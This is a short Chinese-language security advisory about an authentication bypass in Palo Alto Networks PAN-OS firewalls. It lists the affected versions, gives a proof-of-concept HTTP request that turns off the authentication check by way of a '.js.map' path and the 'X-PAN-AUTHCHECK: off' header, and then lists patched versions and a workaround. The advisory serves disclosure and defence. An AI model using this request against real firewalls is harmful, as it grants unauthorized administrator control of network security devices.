# Palo Alto Networks PAN-OS身份验证绕过漏洞

Palo Alto Networks是全球知名的网络安全厂商，PAN-OS是Palo Alto Networks为其防火墙设备开发的操作系统。

Palo Alto Networks PAN-OS多个受影响版本中存在身份验证绕过漏洞，该漏洞的CVSS评分为9.3，可能导致未经身份验证的攻击者通过网络访问管理Web界面，从而获得PAN-OS管理员权限以执行管理操作、篡改配置或利用其他经过身份验证的特权提升漏洞（如CVE-2024-9474）。

## 影响范围
> PAN OS 11.2 < 11.2.4-h1
> 
> PAN OS 11.1 < 11.1.5-h1
>
> PAN OS 11.0 < 11.0.6-h1
>
> PAN OS 10.2 < 10.2.12-h2

## POC
关键在于相关nginx配置中的匹配到.js.map会被作为静态资源进行代理。
同时设置HTTP请求头中的HTTP_X_PAN_AUTHCHECK为off，即可关闭认证检查。
```http
GET /php/ztp_gate.php/.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off

## 安全措施
### 升级版本
> PAN OS 11.2 >= 11.2.4-h1
> 
> PAN OS 11.1 >= 11.1.5-h1
> 
> PAN OS 11.0 >= 11.0.6-h1
> 
> PAN OS 10.2 >= 10.2.12-h2
### 临时做法
将管理接口的访问限制为仅受信任的内部IP地址，以防止来自互联网的外部访问。

  
